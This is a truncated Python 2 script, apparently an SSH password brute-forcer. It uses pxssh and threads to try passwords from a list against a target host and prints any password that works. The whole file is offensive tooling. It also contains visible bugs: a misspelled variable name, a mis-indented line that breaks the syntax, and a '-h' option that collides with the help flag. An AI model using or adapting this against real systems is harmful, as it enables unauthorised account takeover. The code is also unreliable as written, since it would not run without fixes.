import pxssh
import optparse
import time
from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value = msxConnections)
Found = False
Fails = 0

def connect(host, user, passwd, release):
  global Found, Fails
  try:
    s = pxssh.pxssh()
    s.login(host, user, passwd)
    print '[+] Password Found: ' + passwd
  Found = True
  except Exception, e:
    if 'read_nonblocking' in str(e):
      Fails += 1
      time.sleep(5)
      connect(host, user, passwd, False)
    elif 'synchronize with original prompt' in str(e):
      time.sleep(1)
      connect(host, user, passwd, False)
  finally:
    if release:
      connection_lock.release()


def main():
  parser = optparse.OptionParser('usage%prog' +'-h <target host> -u [user] -f [password list]')
  parser.add_option('-h', dest = 'tgtHost', type="string", help="specify target host")
  parser.add_option('-f', dest = 'passwdFile', type="string", help="specify password file")